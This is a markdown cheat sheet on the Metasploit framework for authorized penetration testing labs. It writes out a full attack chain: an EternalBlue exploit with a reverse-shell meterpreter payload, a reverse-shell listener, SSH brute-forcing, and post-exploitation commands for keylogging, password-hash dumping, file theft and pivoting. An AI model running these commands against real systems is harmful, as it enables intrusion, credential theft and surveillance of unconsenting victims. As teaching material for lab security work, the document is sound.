# ⚔️ METASPLOIT FRAMEWORK (ETHICAL HACKING / PENTESTING)

> **⚠️ WARNING:**  
> Metasploit is **ILLEGAL** on unauthorized systems.  
> Always get **written permission** before testing.  
> Use in labs like **Hack The Box**, **TryHackMe**, or **VulnHub**.

---

## ✅ MUST-HAVE

- Metasploit installed:  
  ```bash
  sudo apt install metasploit-framework
Run as root for some actions:

sudo msfconsole
Use only on authorized systems/labs.

🚀 1. START METASPLOIT
Launch the console:

msfconsole
Quick start (no banner):

msfconsole -q
⚙️ 2. BASIC COMMANDS
Help menu:

help
Search for modules:

search <keyword>
# Example:
search eternalblue
Use a module:

use <module_path>
# Example:
use exploit/windows/smb/ms17_010_eternalblue
Show module options:

show options
Set a module option:

set <OPTION> <value>
# Example:
set RHOSTS 192.168.1.100
Run the module:

exploit
💥 3. EXPLOIT EXAMPLES
🧠 EternalBlue (MS17-010)

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_IP>
exploit
🌀 Reverse Shell (Linux/Windows)

use multi/handler
set PAYLOAD <payload>            # e.g. linux/x86/shell_reverse_tcp
set LHOST <your_IP>
set LPORT 4444
exploit
🧠 4. METERPRETER (POST-EXPLOITATION)
Command	Description
sysinfo	Get target system info
shell	Open a shell on the victim
upload <file>	Upload file to target
download <file>	Download file from target
screenshot	Take screenshot
keyscan_start	Start keylogger (⚠️ ethical warning)
ps	View active processes on target
migrate <PID>	Move to another process
getuid	Show current user ID
hashdump	Dump password hashes (if permitted)

Routing (pivoting):

run autoroute -s 10.10.10.0/24
route print
🔧 5. AUXILIARY MODULES
🔍 Port Scanning

use auxiliary/scanner/portscan/tcp
set RHOSTS <target_IP>
set PORTS 1-1000
run
🔓 Password Cracking (e.g. SSH Brute-Force)

use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target_IP>
set USERPASS_FILE <wordlist.txt>
run
🕵️ Proxy Server (SOCKS5)

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run
🛡️ 6. DEFENSIVE COUNTERMEASURES
Apply system patches (e.g., MS17-010).

Use firewalls to block unused ports.

Monitor suspicious processes (e.g., meterpreter sessions).